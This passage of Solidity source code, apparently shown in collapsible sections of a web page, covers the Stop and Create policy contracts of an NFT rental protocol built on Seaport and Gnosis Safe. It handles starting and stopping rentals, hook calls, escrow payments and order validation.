        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // Modules that the policy depends on.
        Storage public STORE;
        PaymentEscrow public ESCRW;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) Signer() Reclaimer() {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](2);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));

            dependencies[1] = toKeycode("ESCRW");
            ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
        }

        /**
        * @notice Upon policy activation, permissions are requested from the kernel to access
        *         particular keycode <> function selector pairs. Once these permissions are
        *         granted, they do not change and can only be revoked when the policy is
        *         deactivated by the kernel.
        *
        * @return requests Array of keycode <> function selector pairs which represent
        *                  permissions for the policy.
        */
        function requestPermissions()
            external
            view
            override
            onlyKernel
            returns (Permissions[] memory requests)
        {
            requests = new Permissions[](4);
            requests[0] = Permissions(toKeycode("STORE"), STORE.removeRentals.selector);
            requests[1] = Permissions(toKeycode("STORE"), STORE.removeRentalsBatch.selector);
            requests[2] = Permissions(toKeycode("ESCRW"), ESCRW.settlePayment.selector);
            requests[3] = Permissions(toKeycode("ESCRW"), ESCRW.settlePaymentBatch.selector);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Internal Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Helper function to emit an event which signals a rental order has stopped.
        *
        * @param seaportOrderHash Order hash of the seaport order.
        * @param stopper Address which stopped the rental order.
        */
        function _emitRentalOrderStopped(bytes32 seaportOrderHash, address stopper) internal {
            // Wmit the event.
            emit Events.RentalOrderStopped(seaportOrderHash, stopper);
        }

        /**
        * @dev Validates that a rental order can be stopped. Whether an order
        *      can be stopped is dependent on the type of order. BASE orders can
        *      be stopped only when the rental has expired. PAY orders can be stopped
        *      by the lender at any point in the time.
        *
        * @param orderType Order type of the rental order to stop.
        * @param endTimestamp Timestamp that the rental will end.
        * @param expectedLender Address of the initial lender in the order.
        */
        function _validateRentalCanBeStopped(
            OrderType orderType,
            uint256 endTimestamp,
            address expectedLender
        ) internal view {
            // Determine if the order has expired.
            bool hasExpired = endTimestamp <= block.timestamp;

            // Determine if the fulfiller is the lender of the order.
            bool isLender = expectedLender == msg.sender;

            // BASE orders processing.
            if (orderType.isBaseOrder()) {
                // check that the period for the rental order has expired.
                if (!hasExpired) {
                    revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
                }
            }
            // PAY order processing.
            else if (orderType.isPayOrder()) {
                // If the stopper is the lender, then it doesnt matter whether the rental
                // has expired. But if the stopper is not the lender, then the rental must have expired.
                if (!isLender && (!hasExpired)) {
                    revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);
                }
            }
            // Revert if given an invalid order type.
            else {
                revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
            }
        }

        /**
        * @dev Since the stop policy is an enabled Gnosis Safe module on all rental safes, it
        *      can be used to execute a transaction directly from the rental safe which retrieves
        *      the rented assets. This call bypasses the guard that prevents the assets from being
        *      transferred.
        *
        * @param order Rental order to reclaim the items for.
        */
        function _reclaimRentedItems(RentalOrder memory order) internal {
            // Transfer ERC721s from the renter back to lender.
            bool success = ISafe(order.rentalWallet).execTransactionFromModule(
                // Stop policy inherits the reclaimer package.
                address(this),
                // value.
                0,
                // The encoded call to the `reclaimRentalOrder` function.
                abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),
                // Safe must delegate call to the stop policy so that it is the msg.sender.
                Enum.Operation.DelegateCall
            );

            // Assert that the transfer back to the lender was successful.
            if (!success) {
                revert Errors.StopPolicy_ReclaimFailed();
            }
        }

        /**
        * @dev When a rental order is stopped, process each hook one by one but only if
        *      the hook's status is set to execute on a rental stop.
        *
        * @param hooks        Array of hooks to process for the order.
        * @param rentalItems  Array of rental items which are referenced by the hooks
        * @param rentalWallet Address of the rental wallet which is the current owner
        *                     of the rented assets.
        */
        function _removeHooks(
            Hook[] calldata hooks,
            Item[] calldata rentalItems,
            address rentalWallet
        ) internal {
            // Define hook target, item index, and item.
            address target;
            uint256 itemIndex;
            Item memory item;

            // Loop through each hook in the payload.
            for (uint256 i = 0; i < hooks.length; ++i) {
                // Get the hook address.
                target = hooks[i].target;

                // Check that the hook is reNFT-approved to execute on rental stop.
                if (STORE.hookOnStop(target)) {
                    // Get the rental item index for this hook.
                    itemIndex = hooks[i].itemIndex;

                    // Get the rental item for this hook.
                    item = rentalItems[itemIndex];

                    // Make sure the item is a rented item.
                    if (!item.isRental()) {
                        revert Errors.Shared_NonRentalHookItem(itemIndex);
                    }

                    // Call the hook with data about the rented item.
                    try
                        IHook(target).onStop(
                            rentalWallet,
                            item.token,
                            item.identifier,
                            item.amount,
                            hooks[i].extraData
                        )
                    {} catch Error(string memory revertReason) {
                        // Revert with reason given.
                        revert Errors.Shared_HookFailString(revertReason);
                    } catch Panic(uint256 errorCode) {
                        // Convert solidity panic code to string.
                        string memory stringErrorCode = LibString.toString(errorCode);

                        // Revert with panic code.
                        revert Errors.Shared_HookFailString(
                            string.concat("Hook reverted: Panic code ", stringErrorCode)
                        );
                    } catch (bytes memory revertData) {
                        // Fallback to an error that returns the byte data.
                        revert Errors.Shared_HookFailBytes(revertData);
                    }
                }
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Stops a rental by providing a `RentalOrder` struct. This data does not
        *         exist in protocol storage, only the hash of the rental order. However,
        *         during rental creation, all data needed to construct the rental order
        *         is emitted as an event. A check is then made to ensure that the passed
        *         in rental order matches the hash of a rental order in storage.
        *
        * @param order Rental order to stop.
        */
        function stopRent(RentalOrder calldata order) external {
            // Compute the order hash.
            bytes32 orderHash = _deriveRentalOrderHash(order);

            // The order must exist to be deleted.
            if (!STORE.orders(orderHash)) {
                revert Errors.StopPolicy_OrderDoesNotExist(orderHash);
            }

            // Check that the rental can be stopped.
            _validateRentalCanBeStopped(order.orderType, order.endTimestamp, order.lender);

            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
            // the rented amount. From this point on, new memory cannot be safely allocated until the
            // accumulator no longer needs to include elements.
            bytes memory rentalAssetUpdates = new bytes(0);

            // Check if each item in the order is a rental. If so, then generate the rental asset update.
            // Memory will become safe again after this block.
            for (uint256 i; i < order.items.length; ++i) {
                if (order.items[i].isRental()) {
                    // Insert the rental asset update into the dynamic array.
                    _insert(
                        rentalAssetUpdates,
                        order.items[i].toRentalId(order.rentalWallet),
                        order.items[i].amount
                    );
                }
            }

            // Effect: Remove rentals from storage by using the order hash.
            STORE.removeRentals(orderHash, _convertToStatic(rentalAssetUpdates), order.items);

            // Interaction: Transfer rentals from the renter back to lender.
            _reclaimRentedItems(order);

            // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
            ESCRW.settlePayment(order);

            // Interaction: process hooks so they no longer exist for the renter.
            if (order.hooks.length > 0) {
                _removeHooks(order.hooks, order.items, order.rentalWallet);
            }

            // Emit rental order stopped.
            _emitRentalOrderStopped(order.seaportOrderHash, msg.sender);
        }

        /**
        * @notice Stops a batch of rentals by providing an array of `RentalOrder` structs.
        *
        * @param orders Array of rental orders to stop.
        */
        function stopRentBatch(RentalOrder[] calldata orders) external {
            // Process each rental order.
            // Memory will become safe after this block.
            for (uint256 i = 0; i < orders.length; ++i) {
                // Compute the order hash.
                bytes32 orderHash = _deriveRentalOrderHash(orders[i]);

                // The order must exist to be deleted.
                if (!STORE.orders(orderHash)) {
                    revert Errors.StopPolicy_OrderDoesNotExist(orderHash);
                }

                // Check that the rental can be stopped.
                _validateRentalCanBeStopped(
                    orders[i].orderType,
                    orders[i].endTimestamp,
                    orders[i].lender
                );

                // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
                // the rented amount. From this point on, new memory cannot be safely allocated until the
                // accumulator no longer needs to include elements.
                bytes memory rentalAssetUpdates = new bytes(0);

                // Check if each item in the order is a rental. If so, then generate the rental asset update.
                for (uint256 j = 0; j < orders[i].items.length; ++j) {
                    // Insert the rental asset update into the dynamic array.
                    if (orders[i].items[j].isRental()) {
                        _insert(
                            rentalAssetUpdates,
                            orders[i].items[j].toRentalId(orders[i].rentalWallet),
                            orders[i].items[j].amount
                        );
                    }
                }

                // Effect: Remove rentals from storage by using the order hash.
                STORE.removeRentals(orderHash, _convertToStatic(rentalAssetUpdates), orders[i].items);

                // Interaction: Transfer rentals from the renter back to lender.
                _reclaimRentedItems(orders[i]);

                // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
                ESCRW.settlePayment(orders[i]);

                // Interaction: Process hooks so they no longer exist for the renter.
                if (orders[i].hooks.length > 0) {
                    _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet);
                }

                // Emit rental order stopped.
                _emitRentalOrderStopped(orderHash, msg.sender);
            }
        }
    }

</details>

<details>
<summary><b>Create.sol</b></summary>



    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ZoneParameters,
        OrderType as SeaportOrderType
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";
    import {ReceivedItem, SpentItem} from "@seaport-types/lib/ConsiderationStructs.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {IERC20} from "@openzeppelin-contracts/interfaces/IERC20.sol";

    import {ISafe} from "@src/interfaces/ISafe.sol";
    import {IHook} from "@src/interfaces/IHook.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode, toRole} from "@src/libraries/KernelUtils.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {Transferer} from "@src/libraries/Transferer.sol";
    import {Signer} from "@src/packages/Signer.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {Accumulator} from "@src/packages/Accumulator.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {
        RentalOrder,
        RentPayload,
        SeaportPayload,
        Hook,
        OrderFulfillment,
        OrderMetadata,
        OrderType,
        Item,
        ItemType,
        SettleTo,
        RentalId,
        RentalAssetUpdate
    } from "@src/libraries/RentalStructs.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Events} from "@src/libraries/Events.sol";

    /**
    * @title Create
    * @notice Acts as an interface for all behavior related to creating a rental.
    */
    contract Create is Policy, Signer, Zone, Accumulator, TokenReceiver {
        using Transferer for address;
        using Transferer for Item;
        using RentalUtils for Item;
        using RentalUtils for Item[];
        using RentalUtils for SpentItem;
        using RentalUtils for ReceivedItem;
        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // Modules that the policy depends on.
        Storage public STORE;
        PaymentEscrow public ESCRW;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) Signer() Zone() {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](2);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));

            dependencies[1] = toKeycode("ESCRW");
            ESCRW = PaymentEscrow(getModuleAddress(toKeycode("ESCRW")));
        }

        /**
        * @notice Upon policy activation, permissions are requested from the kernel to access
        *         particular keycode <> function selector pairs. Once these permissions are
        *         granted, they do not change and can only be revoked when the policy is
        *         deactivated by the kernel.
        *
        * @return requests Array of keycode <> function selector pairs which represent
        *                  permissions for the policy.
        */
        function requestPermissions()
            external
            view
            override
            onlyKernel
            returns (Permissions[] memory requests)
        {
            requests = new Permissions[](2);
            requests[0] = Permissions(toKeycode("STORE"), STORE.addRentals.selector);
            requests[1] = Permissions(toKeycode("ESCRW"), ESCRW.increaseDeposit.selector);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              View Functions                                 //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Retrieves the domain separator.
        *
        * @return The domain separator for the protocol.
        */
        function domainSeparator() external view returns (bytes32) {
            return _DOMAIN_SEPARATOR;
        }

        /**
        * @notice Derives the rental order EIP-712 compliant hash from a `RentalOrder`.
        *
        * @param order Rental order converted to a hash.
        */
        function getRentalOrderHash(
            RentalOrder memory order
        ) external view returns (bytes32) {
            return _deriveRentalOrderHash(order);
        }

        /**
        * @notice Derives the rent payload EIP-712 compliant hash from a `RentPayload`.
        *
        * @param payload Rent payload converted to a hash.
        */
        function getRentPayloadHash(
            RentPayload memory payload
        ) external view returns (bytes32) {
            return _deriveRentPayloadHash(payload);
        }

        /**
        * @notice Derives the order metadata EIP-712 compliant hash from an `OrderMetadata`.
        *
        * @param metadata Order metadata converted to a hash.
        */
        function getOrderMetadataHash(
            OrderMetadata memory metadata
        ) external view returns (bytes32) {
            return _deriveOrderMetadataHash(metadata);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Internal Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Helper function to emit an event which signals a rental order has started.
        *
        * @param order     Rental order to emit.
        * @param orderHash Order hash of the seaport order.
        * @param extraData Any extra data to be emitted which was supplied by the offerer.
        */
        function _emitRentalOrderStarted(
            RentalOrder memory order,
            bytes32 orderHash,
            bytes memory extraData
        ) internal {
            // Emit the event.
            emit Events.RentalOrderStarted(
                orderHash,
                extraData,
                order.seaportOrderHash,
                order.items,
                order.hooks,
                order.orderType,
                order.lender,
                order.renter,
                order.rentalWallet,
                order.startTimestamp,
                order.endTimestamp
            );
        }

        /**
        * @dev Processes the offer items for inclusion in a BASE order. All offer items must
        *      adhere to the BASE order format, else execution will revert.
        *
        * @param rentalItems Running array of items that comprise the rental order.
        * @param offers      Array of offer items to include in the the order.
        * @param startIndex  Index to begin adding the offer items to the
        *                    `rentalItems` array.
        */
        function _processBaseOrderOffer(
            Item[] memory rentalItems,
            SpentItem[] memory offers,
            uint256 startIndex
        ) internal pure {
            // Must be at least one offer item.
            if (offers.length == 0) {
                revert Errors.CreatePolicy_OfferCountZero();
            }

            // Define elements of the item which depend on the token type.
            ItemType itemType;

            // Process each offer item.
            for (uint256 i; i < offers.length; ++i) {
                // Get the offer item.
                SpentItem memory offer = offers[i];

                // Handle the ERC721 item.
                if (offer.isERC721()) {
                    itemType = ItemType.ERC721;
                }
                // Handle the ERC1155 item.
                else if (offer.isERC1155()) {
                    itemType = ItemType.ERC1155;
                }
                // ERC20s are not supported as offer items in a BASE order.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);
                }

                // An ERC721 or ERC1155 offer item is considered a rented asset which will be
                // returned to the lender upon expiration of the rental order.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: SettleTo.LENDER,
                    token: offer.token,
                    amount: offer.amount,
                    identifier: offer.identifier
                });
            }
        }

        /**
        * @dev Processes the offer items for inclusion in a PAY order. All offer items must
        *      adhere to the PAY order format, else execution will revert.
        *
        * @param rentalItems Running array of items that comprise the rental order.
        * @param offers      Array of offer items to include in the the order.
        * @param startIndex  Index to begin adding the offer items to the
        *                    `rentalItems` array.
        */
        function _processPayOrderOffer(
            Item[] memory rentalItems,
            SpentItem[] memory offers,
            uint256 startIndex
        ) internal pure {
            // Keep track of each item type.
            uint256 totalRentals;
            uint256 totalPayments;

            // Define elements of the item which depend on the token type.
            ItemType itemType;
            SettleTo settleTo;

            // Process each offer item.
            for (uint256 i; i < offers.length; ++i) {
                // Get the offer item.
                SpentItem memory offer = offers[i];

                // Handle the ERC721 item.
                if (offer.isERC721()) {
                    // The ERC721 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC721;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Handle the ERC1155 item.
                else if (offer.isERC1155()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC1155;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC20 offer item.
                else if (offer.isERC20()) {
                    // An ERC20 offer item is considered a payment to the renter upon
                    // expiration of the rental order.
                    itemType = ItemType.ERC20;
                    settleTo = SettleTo.RENTER;

                    // Increment payments.
                    totalPayments++;
                }
                // Revert if unsupported item type.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);
                }

                // Create the item.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offer.token,
                    amount: offer.amount,
                    identifier: offer.identifier
                });
            }

            // PAY order offer must have at least one rental and one payment.
            if (totalRentals == 0 || totalPayments == 0) {
                revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);
            }
        }

        /**
        * @dev Processes the consideration items for inclusion in a BASE order. All
        *      consideration items must adhere to the BASE order format, else
        *      execution will revert.
        *
        * @param rentalItems    Running array of items that comprise the rental order.
        * @param considerations Array of consideration items to include in the the order.
        * @param startIndex     Index to begin adding the offer items to the
        *                       `rentalItems` array.
        */
        function _processBaseOrderConsideration(
            Item[] memory rentalItems,
            ReceivedItem[] memory considerations,
            uint256 startIndex
        ) internal pure {
            // Must be at least one consideration item.
            if (considerations.length == 0) {
                revert Errors.CreatePolicy_ConsiderationCountZero();
            }

            // Process each consideration item.
            for (uint256 i; i < considerations.length; ++i) {
                // Get the consideration item.
                ReceivedItem memory consideration = considerations[i];

                // Only process an ERC20 item.
                if (!consideration.isERC20()) {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                        consideration.itemType
                    );
                }

                // An ERC20 consideration item is considered a payment to the lender upon
                // expiration of the rental order.
                rentalItems[i + startIndex] = Item({
                    itemType: ItemType.ERC20,
                    settleTo: SettleTo.LENDER,
                    token: consideration.token,
                    amount: consideration.amount,
                    identifier: consideration.identifier
                });
            }
        }

        /**
        * @dev Processes the consideration items for inclusion in a PAYEE order. All
        *      consideration items must adhere to the PAYEE order format, else
        *      execution will revert.
        *
        * @param considerations Array of consideration items to include in the the order.
        */
        function _processPayeeOrderConsideration(
            Item[] memory rentalItems,
            ReceivedItem[] memory considerations,
            uint256 startIndex
        ) internal pure {
            // Keep track of each item type.
            uint256 totalRentals;
            uint256 totalPayments;

            // Define elements of the item which depend on the token type.
            ItemType itemType;
            SettleTo settleTo;

            // Process each consideration item.
            for (uint256 i; i < considerations.length; ++i) {
                // Get the consideration item.
                ReceivedItem memory consideration = considerations[i];

                // Process an ERC721 item.
                if (consideration.isERC721()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC721;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC1155 item
                else if (consideration.isERC1155()) {
                    // The ERC1155 will be returned to the lender upon expiration
                    // of the rental order.
                    itemType = ItemType.ERC1155;
                    settleTo = SettleTo.LENDER;

                    // Increment rentals.
                    totalRentals++;
                }
                // Process an ERC20 item.
                else if (consideration.isERC20()) {
                    // An ERC20 offer item is considered a payment to the renter upon
                    // expiration of the rental order.
                    itemType = ItemType.ERC20;
                    settleTo = SettleTo.RENTER;

                    // Increment payments.
                    totalPayments++;
                }
                // Revert if unsupported item type.
                else {
                    revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                        consideration.itemType
                    );
                }

                // Create the item.
                rentalItems[i + startIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: consideration.token,
                    amount: consideration.amount,
                    identifier: consideration.identifier
                });
            }

            // PAYEE order consideration must have at least one rental and one payment.
            if (totalRentals == 0 || totalPayments == 0) {
                revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);
            }
        }

        /**
        * @dev Converts an offer array and a consideration array into a single array of
        *      `Item` which comprise a rental order. The offers and considerations must
        *      adhere to a specific set of rules depending on the type of order being
        *      constructed.
        *
        * @param offers         Array of Seaport offer items.
        * @param considerations Array of seaport consideration items.
        * @param orderType      Order type of the rental.
        */
        function _convertToItems(
            SpentItem[] memory offers,
            ReceivedItem[] memory considerations,
            OrderType orderType
        ) internal pure returns (Item[] memory items) {
            // Initialize an array of items.
            items = new Item[](offers.length + considerations.length);

            // Process items for a base order.
            if (orderType.isBaseOrder()) {
                // Process offer items.
                _processBaseOrderOffer(items, offers, 0);

                // Process consideration items.
                _processBaseOrderConsideration(items, considerations, offers.length);
            }
            // Process items for a pay order.
            else if (orderType.isPayOrder()) {
                // Process offer items.
                _processPayOrderOffer(items, offers, 0);

                // Assert that no consideration items are provided.
                if (considerations.length > 0) {
                    revert Errors.CreatePolicy_ConsiderationCountNonZero(
                        considerations.length
                    );
                }
            }
            // Process items for a payee order.
            else if (orderType.isPayeeOrder()) {
                // Assert that no offer items are provided.
                if (offers.length > 0) {
                    revert Errors.CreatePolicy_OfferCountNonZero(offers.length);
                }

                // Process consideration items.
                _processPayeeOrderConsideration(items, considerations, 0);
            }
            // Revert if order type is not supported.
            else {
                revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
            }
        }

        /**
        * @dev When a rental order is created, process each hook one by one but only if
        *      the hook's status is set to execute on a rental start.
        *
        * @param hooks        Array of hooks to process for the order.
        * @param offerItems   Array of offer items which are referenced by the hooks
        * @param rentalWallet Address of the rental wallet which is the recipient
        *                     of the rented assets.
        */
        function _addHooks(
            Hook[] memory hooks,
            SpentItem[] memory offerItems,
            address rentalWallet
        ) internal {
            // Define hook target, offer item index, and an offer item.
            address target;
            uint256 itemIndex;
            SpentItem memory offer;

            // Loop through each hook in the payload.
            for (uint256 i = 0; i < hooks.length; ++i) {
                // Get the hook's target address.
                target = hooks[i].target;

                // Check that the hook is reNFT-approved to execute on rental start.
                if (STORE.hookOnStart(target)) {
                    // Get the offer item index for this hook.
                    itemIndex = hooks[i].itemIndex;

                    // Get the offer item for this hook.
                    offer = offerItems[itemIndex];

                    // Make sure the offer item is an ERC721 or ERC1155.
                    if (!offer.isRental()) {
                        revert Errors.Shared_NonRentalHookItem(itemIndex);
                    }

                    // Call the hook with data about the rented item.
                    try
                        IHook(target).onStart(
                            rentalWallet,
                            offer.token,
                            offer.identifier,
                            offer.amount,
                            hooks[i].extraData
                        )
                    {} catch Error(string memory revertReason) {
                        // Revert with reason given.
                        revert Errors.Shared_HookFailString(revertReason);
                    } catch Panic(uint256 errorCode) {
                        // Convert solidity panic code to string.
                        string memory stringErrorCode = LibString.toString(errorCode);

                        // Revert with panic code.
                        revert Errors.Shared_HookFailString(
                            string.concat("Hook reverted: Panic code ", stringErrorCode)
                        );
                    } catch (bytes memory revertData) {
                        // Fallback to an error that returns the byte data.
                        revert Errors.Shared_HookFailBytes(revertData);
                    }
                }
            }
        }

        /**
        * @dev Initiates a rental order using a rental payload received by the fulfiller,
        *      and a payload from seaport with data involving the assets that were
        *      transferred in the order.
        *
        * @param payload Payload from the order fulfiller.
        * @param seaportPayload Payload containing the result of a seaport order fulfillment.
        */
        function _rentFromZone(
            RentPayload memory payload,
            SeaportPayload memory seaportPayload
        ) internal {
            // Check: Only full restricted orders are supported.
            _isValidSeaportOrderType(seaportPayload.orderType);

            // Check: The payload is being used for the correct order.
            _isValidPayloadForOrder(payload.orderHash, seaportPayload.orderHash);

            // Check: make sure order metadata is valid with the given seaport order zone hash.
            _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);

            // Check: verify the fulfiller of the order is an owner of the recipient safe.
            _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);

            // Check: verify each execution was sent to the expected destination.
            _executionInvariantChecks(seaportPayload.totalExecutions);

            // Check: validate and process seaport offer and consideration items based
            // on the order type.
            Item[] memory items = _convertToItems(
                seaportPayload.offer,
                seaportPayload.consideration,
                payload.metadata.orderType
            );

            // Check: Once all items have been processed, confirm that all items adhere to the
            // protocol whitelist for rented assets and payments.
            _checkProtocolWhitelist(items);

            // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders
            // do not need to be processed in the same way that other order types do.
            if (
                payload.metadata.orderType.isBaseOrder() ||
                payload.metadata.orderType.isPayOrder()
            ) {
                // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and
                // the rented amount. From this point on, new memory cannot be safely allocated until the
                // accumulator no longer needs to include elements.
                bytes memory rentalAssetUpdates = new bytes(0);

                // Check if each item is a rental. If so, then generate the rental asset update.
                // Memory will become safe again after this block.
                for (uint256 i; i < items.length; ++i) {
                    if (items[i].isRental()) {
                        // Insert the rental asset update into the dynamic array.
                        _insert(
                            rentalAssetUpdates,
                            items[i].toRentalId(payload.fulfillment.recipient),
                            items[i].amount
                        );
                    }
                }

                // Generate the rental order.
                RentalOrder memory order = RentalOrder({
                    seaportOrderHash: seaportPayload.orderHash,
                    items: items,
                    hooks: payload.metadata.hooks,
                    orderType: payload.metadata.orderType,
                    lender: seaportPayload.offerer,
                    renter: payload.intendedFulfiller,
                    rentalWallet: payload.fulfillment.recipient,
                    startTimestamp: block.timestamp,
                    endTimestamp: block.timestamp + payload.metadata.rentDuration
                });

                // Compute the order hash.
                bytes32 orderHash = _deriveRentalOrderHash(order);

                // Interaction: Update storage only if the order is a Base Order or Pay order.
                STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates), items);

                // Interaction: Send tokens to their expected destinations. The rented assets
                // will go to the rental wallet and the payments will go to the escrow.
                for (uint256 i = 0; i < items.length; ++i) {
                    Item memory item = items[i];

                    if (item.isERC20()) {
                        // Send tokens to the payment escrow.
                        item.token.transferERC20(address(ESCRW), item.amount);

                        // increase deposit on the escrow
                        ESCRW.increaseDeposit(item.token, item.amount);
                    } else if (item.isERC721()) {
                        // Send ERC721 to the rental wallet.
                        item.transferERC721(order.rentalWallet);
                    } else if (item.isERC1155()) {
                        // Send ERC1155 to the rental wallet.
                        item.transferERC1155(order.rentalWallet);
                    }
                }

                // Interaction: Process the hooks associated with this rental.
                if (payload.metadata.hooks.length > 0) {
                    _addHooks(
                        payload.metadata.hooks,
                        seaportPayload.offer,
                        payload.fulfillment.recipient
                    );
                }

                // Emit rental order started.
                _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);
            }
        }

        /**
        * @dev Checks that the seaport order type is supported.
        *
        * @param orderType Order type for the order to fulfill.
        */
        function _isValidSeaportOrderType(SeaportOrderType orderType) internal pure {
            if (orderType != SeaportOrderType.FULL_RESTRICTED) {
                revert Errors.CreatePolicy_SeaportOrderTypeNotSupported(orderType);
            }
        }

        /**
        * @dev Checks that a payload is being used for the correct seaport order.
        *
        * @param payloadOrderHash Order hash that the payload expects.
        * @param seaportOrderHash Order hash of the order being fulfilled.
        */
        function _isValidPayloadForOrder(
            bytes32 payloadOrderHash,
            bytes32 seaportOrderHash
        ) internal pure {
            if (payloadOrderHash != seaportOrderHash) {
                revert Errors.CreatePolicy_InvalidPayloadForOrderHash(
                    payloadOrderHash,
                    seaportOrderHash
                );
            }
        }

        /**
        * @dev Checks that the order metadata passed with the seaport order is expected.
        *
        * @param metadata Order metadata that was passed in with the fulfillment.
        * @param zoneHash Hash of the order metadata that was passed in when the Seaport
        *                 order was signed.
        */
        function _isValidOrderMetadata(
            OrderMetadata memory metadata,
            bytes32 zoneHash
        ) internal view {
            // Check that the rent duration specified is not too long.
            if (STORE.maxRentDuration() < metadata.rentDuration) {
                revert Errors.CreatePolicy_RentDurationTooLong(metadata.rentDuration);
            }

            // Check that the rent duration specified is not zero.
            if (metadata.rentDuration == 0) {
                revert Errors.CreatePolicy_RentDurationZero();
            }

            // Check that the zone hash is equal to the derived hash of the metadata.
            if (_deriveOrderMetadataHash(metadata) != zoneHash) {
                revert Errors.CreatePolicy_InvalidOrderMetadataHash();
            }
        }

        /**
        * @dev Checks that an address is the owner of a protocol-deployed rental safe.
        *
        * @param owner Address of the potential safe owner.
        * @param safe  Address of the potential protocol-deployed rental safe.
        */
        function _isValidSafeOwner(address owner, address safe) internal view {
            // Make sure only protocol-deployed safes can rent.
            if (STORE.deployedSafes(safe) == 0) {
                revert Errors.CreatePolicy_InvalidRentalSafe(safe);
            }

            // Make sure the fulfiller is the owner of the recipient rental safe.
            if (!ISafe(safe).isOwner(owner)) {
                revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);
            }
        }

        /**
        * @dev After a Seaport order has been executed, invariant checks are made to ensure
        *      that all assets were sent to the correct address. More specifically, all
        *      tokens must first be sent to the Create Policy.
        *
        * @param executions Each execution that was performed by Seaport.
        */
        function _executionInvariantChecks(ReceivedItem[] memory executions) internal view {
            for (uint256 i = 0; i < executions.length; ++i) {
                ReceivedItem memory execution = executions[i];

                // All tokens must first be sent to the Create Policy.
                if (execution.recipient != address(this)) {
                    revert Errors.CreatePolicy_UnexpectedTokenRecipient(
                        execution.itemType,
                        execution.token,
                        execution.identifier,
                        execution.amount,
                        execution.recipient,
                        address(this)
                    );
                }
            }
        }

